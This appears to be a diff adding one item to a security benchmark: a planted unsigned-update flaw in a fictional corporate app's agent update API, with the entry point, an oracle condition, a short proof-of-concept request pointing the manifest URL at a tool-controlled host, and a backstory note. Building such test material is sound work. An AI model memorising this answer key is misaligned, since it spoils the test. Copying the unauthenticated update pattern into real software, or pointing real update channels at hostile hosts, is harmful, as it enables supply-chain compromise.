@@ -1,0 +1,42 @@
+id: BENCH-CORP-0014
+title: Agent update channel accepts a manifest it cannot authenticate
+app: corp
+component: api
+class: unsigned_update
+severity: high
+entrypoint:
+  method: POST
+  path: /api/agents/updates
+  auth: admin
+  param: manifest_url
+  param_in: json
+  default_value: https://updates.meridian-castings.net/agent/stable.json
+  content_type: application/json
+discovery:
+  render: api-only
+  reachable_from:
+  - /admin/agents
+  requires:
+  - form-submit
+  - multi-step-flow
+  difficulty: 5
+oracle:
+  kind: state
+  condition: The desktop agent's update manifest is fetched from a caller-supplied address and its packages
+    are checked against a digest carried by that same manifest, which authenticates nothing. The sink
+    fires when a package has been staged for delivery to agents whose manifest carried no publisher signature
+    AND whose origin is not the vendor's own update host, i.e. an unauthenticated payload actually entered
+    the channel. Fetching a manifest that fails to parse, or one that is correctly signed, does not fire
+    it.
+  poc: POST /api/agents/updates with the administrator's session cookie and {"manifest_url":"http://<any
+    host the tool controls>/stable.json"}
+  signal: corp.agents.update.unsigned_accepted
+tags:
+- rest
+- authenticated
+- admin
+- supply-chain
+introduced: '2026-09-05'
+decoy_note: Signing was on the roadmap for the agent's second release. The digest in the manifest was
+  considered enough because the manifest was only ever meant to come from the vendor host, and the address
+  became configurable when the estate moved to a mirror.
